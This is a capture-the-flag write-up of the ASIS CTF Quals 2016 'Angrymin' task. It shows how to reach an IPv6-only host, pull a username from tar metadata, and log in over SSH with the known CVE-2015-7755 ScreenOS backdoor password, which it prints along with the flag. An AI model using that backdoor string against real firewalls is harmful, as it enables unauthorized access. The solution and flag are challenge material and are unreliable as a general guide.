Angrymin
========

* **CTF:** [ASIS CTF Quals 2016](https://asis-ctf.ir/)
* **Category:** Misc
* **Points:** 52

>> Today, unfortunately I must inform you that I am resigning from my position at you company effective immediately. As each day passed by, it became more clear that you do not care about your customers nor your employees. While I may not be able to change your ways, at least I can stop helping you with my expertise.
>> I have uploaded all the backups, documents and manuals on [here](angrymin.tar.xz). If you find some other sys-admin stupid enough to work for you, those files are more than enough to help him get started. Meanwhile, I am keeping the **username** and **password** for the [firewall](http://juniper.asis-ctf.ir), just to annoy you.
>>
>> Burn in hell,
>>
>> yours truly
>>
>> sys-admin
>
> Would you help this poor boss to find specific username and password?
>
> 4 ≠ 6

We wouldn't expect firewall to expose HTTP server, would we? Indeed, when we click "firewall" link, nothing happens. Some people received errors like `ERR_NAME_NOT_RESOLVED`. Also, for some it was impossible to ping this host:

```
$ ping juniper.asis-ctf.ir
ping: unknown host juniper.asis-ctf.ir
```

This was a bit tricky task and there were a lot questions whether it is broken at CTF IRC channel. It wasn't, but... why some people were unable to access it?

Here's why:

```
$ host juniper.asis-ctf.ir
juniper.asis-ctf.ir has IPv6 address 2406:d501::613c:a652
```

That is, `juniper.asis-ctf.ir` is an IPv6-only host. "4 ≠ 6" in task description was a hint (which was added shortly after CTF began). It is impossible to access IPv6-only host using IPv4 connection... directly. We're not doomed.

We won't describe the details, but there are at least few methods to get IPv6 connection on IPv4-only host (you need some basic networking knowledge):

* **[Teredo](https://en.wikipedia.org/wiki/Teredo_tunneling)** - this mechanism is built-in in Microsoft Windows operating systems and preconfigured to use `teredo.ipv6.microsoft.com` public Teredo gateway. However, to provide optimal user experience, it is configured not to resolve AAAA DNS records (IPv6 address pointers) - this would slower connections with dual-stack (IPv4 and IPv6) hosts, as client may prefer to use IPv6 address (unaware that this is non-native connection involving gateway far, far away in the Internet). Also, Teredo is dormant until we try to connect to some IPv6 host. Pinging address we discovered on our own a few times should be enough to wake it (of course if configured Teredo server is responding, which is not always the case; sometimes there are also problems with NAT traversal).
* **[6to4 anycast](https://en.wikipedia.org/wiki/6to4)** - another easy way to access IPv6 hosts. Some helpful Internet service providers announce their publicly available 6to4 relay under well-known adress of 192.88.99.1 (see what [anycast](https://en.wikipedia.org/wiki/Anycast) is). You only have to configure appropriate route. This method requires you to have public IPv4 address (and router capable of protocol 41 redirection, if you don't connect your PC to ISP network directly).
* **6to4 tunnel** - there are numerous tunnel providers, most notably [Hurricane Electric](https://tunnelbroker.net/) and [SixXS](https://www.sixxs.net/). They require additional configuration (compared to 6to4 anycast), but they allow you to create whole new IPv6 subnet only for yourself (instead of having single IPv6 address). SixXS is also able to work from behind NAT gateways or routers without protocol 41 support (AYIYA - Anything In Anything)!
* **rent a virtual machine** - you can for example use "Droplet" at [DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-enable-ipv6-for-digitalocean-droplets); not all cloud providers support IPv6, so make sure to check features they offer first

Okay. Now we have IPv6 connectivity to `juniper.asis-ctf.ir`. Try pinging it first; note that under Linux operating systems you have to use different command than for IPv4 hosts!

```
$ ping6 juniper.asis-ctf.ir -c4
PING juniper.asis-ctf.ir(2406:d501::613c:a652) 56 data bytes
64 bytes from 2406:d501::613c:a652: icmp_seq=1 ttl=44 time=331 ms
64 bytes from 2406:d501::613c:a652: icmp_seq=2 ttl=44 time=331 ms
64 bytes from 2406:d501::613c:a652: icmp_seq=3 ttl=44 time=331 ms
64 bytes from 2406:d501::613c:a652: icmp_seq=4 ttl=44 time=331 ms

--- juniper.asis-ctf.ir ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 331.792/331.889/331.964/0.709 ms
```

Gotcha. There is still no HTTP server (we get timeouts), but maybe we should try our luck with SSH? (raccoons was our local username; by default SSH tries to use the same username at remote host.)

```
$ ssh juniper.asis-ctf.ir
The authenticity of host 'juniper.asis-ctf.ir (2406:d501::613c:a652)' can't be established.
RSA key fingerprint is 77:03:0f:db:66:9e:22:f7:d1:91:36:66:d6:0d:5e:9a.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'juniper.asis-ctf.ir,2406:d501::613c:a652' (RSA) to the list of known hosts.
raccoons@juniper.asis-ctf.ir's password:
```

Okay. There is an SSH server waiting for us to login. We know that angry admin left us with no username and password, but we have some backups...

```
$ ls -alh
total 1.6M
drwxr-xr-x 2 raccoons raccoons 4.0K May  6 13:37 .
drwxr-xr-x 9 raccoons raccoons 4.0K May  9 20:57 ..
-rwxr-xr-x 1 raccoons raccoons 647K May  6 13:37 630_upgrade.pdf
-rwxr-xr-x 1 raccoons raccoons  62K May  6 13:37 Firewall-Juniper.jpg
-rwxr-xr-x 1 raccoons raccoons  725 May  6 13:37 Links.txt
-rwxr-xr-x 1 raccoons raccoons  20K May  6 13:37 juniper-srx100.jpg
-rwxr-xr-x 1 raccoons raccoons  67K May  6 13:37 netscreen-640x364.jpg
-rwxr-xr-x 1 raccoons raccoons 563K May  6 13:37 rn_540r9.pdf
-rwxr-xr-x 1 raccoons raccoons  22K May  6 13:37 srx100.jpg
-rwxr-xr-x 1 raccoons raccoons 186K May  6 13:37 upgrade_guide.pdf
```

ARGH! There are no backups! These are only some user guides and images. Maybe there is some stegano involved? Erm, no. These are untouched files downloaded straight from the Internet (we've managed to find all of them - except Links.txt - and compare checksums).

But at least we know target device - Juniper SRX100 firewall with ScreenOS. Maybe default passwords are working? Unfortunately, no.

If you are lucky, you've heard something about Juniper at the end of 2015. If not... you would probably start searching for known vulnerabilities now, right?

There is one really interesting critical vulnerability - [CVE-2015-7755: Juniper ScreenOS Authentication Backdoor](https://community.rapid7.com/community/infosec/blog/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor). Speaking briefly, all you need to access ScreenOS device with backdoored firmware, is any valid username and `<<< %s(un='%s') = %u` password (easy to mistake it for some debugging format string in source code, huh?).

We still need a valid username. It's not `netscreen`, it's not `admin`, neither `root` or `sys-admin`. Maybe there something in the `.tar` archive itself? File modification dates seem odd. It's not any of the filenames, there are no comments in archive...

But you should now one little thing, evil sys-admin. By default `tar` preserves file owner and group usernames in plaintext format!

```
$ tar --list -tf juniper.tar.xz
drwxr-xr-x craigswright/craigswright 0 2016-05-06 13:37 juniper/
-rwxr-xr-x craigswright/craigswright 575639 2016-05-06 13:37 juniper/rn_540r9.pdf
-rwxr-xr-x craigswright/craigswright  62711 2016-05-06 13:37 juniper/Firewall-Juniper.jpg
-rwxr-xr-x craigswright/craigswright  19658 2016-05-06 13:37 juniper/juniper-srx100.jpg
-rwxr-xr-x craigswright/craigswright 190373 2016-05-06 13:37 juniper/upgrade_guide.pdf
-rwxr-xr-x craigswright/craigswright    725 2016-05-06 13:37 juniper/Links.txt
-rwxr-xr-x craigswright/craigswright  68122 2016-05-06 13:37 juniper/netscreen-640x364.jpg
-rwxr-xr-x craigswright/craigswright  21671 2016-05-06 13:37 juniper/srx100.jpg
-rwxr-xr-x craigswright/craigswright 662466 2016-05-06 13:37 juniper/630_upgrade.pdf
```

Is `craigswright` our sys-admin from hell?

```
$ ssh juniper.asis-ctf.ir -l craigswright
craigswright@juniper.asis-ctf.ir's password:
ASIS{wh0_1n_h15_r16h7_m1nd_w0uld_b3l13v3_cr416_wr16h7_15_54705h1_n4k4m070}
Connection to juniper.asis-ctf.ir closed.
```

Yes, he is. But we're not sure whether is he a creator of Bitcoin. :)
